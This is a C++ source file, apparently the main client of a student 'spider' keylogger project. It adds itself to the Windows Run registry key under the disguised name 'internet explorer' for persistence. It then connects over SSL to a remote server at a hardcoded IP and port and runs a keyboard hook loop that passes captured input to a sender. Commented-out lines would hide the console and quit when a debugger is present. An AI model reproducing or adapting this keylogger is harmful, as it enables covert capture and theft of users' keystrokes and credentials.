#include "Client.h"
#include "Hooker.h"
#include "Sender.h"
#include <cstdlib>
#include <iostream>
#include <chrono>
#include <boost/bind.hpp>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>

void thread_function(Client *c, boost::asio::io_service *io_service)
{	
	c->init();
	io_service->run();
}

void		addRegister()
{
	std::wstring progPath = L"C:\\Users\\louis\\Documents\\cpp_spider\\client\\ConsoleApplication7\\Debug\\client.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG status = RegSetValueEx(hkey, L"internet explorer", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}

int main(int argc, char* argv[])
{
	//FreeConsole();
	//if (IsDebuggerPresent())
		//return(-1);
	try
	{
		
		addRegister();
		boost::asio::io_service io_service;
		boost::asio::ip::tcp::resolver resolver(io_service);
		boost::asio::ip::tcp::resolver::query query("10.26.113.18", "1337");
		
		//boost::asio::ip::tcp::resolver::query query("37.59.125.25", "1234");
		
		boost::asio::ip::tcp::resolver::iterator iterator = resolver.resolve(query);

		boost::asio::ssl::context ctx(boost::asio::ssl::context::sslv23);
		ctx.load_verify_file("server.crt");


		Client c(io_service, ctx, iterator);
		
		
		Sender postier(&c);
		std::thread t(thread_function, &c, &io_service);
		
		
		
		//std::this_thread::sleep_for(std::chrono::seconds(2));

		Hooker& hooker = Hooker::getInstance();
		hooker.setSender(&postier);
		hooker.runHookLoop();			
		//c.write("ici c cool");
		t.join();

	}
	catch (std::exception& e)
	{
		std::cerr << "Exception: " << e.what() << "\n";
	}

	return 0;
}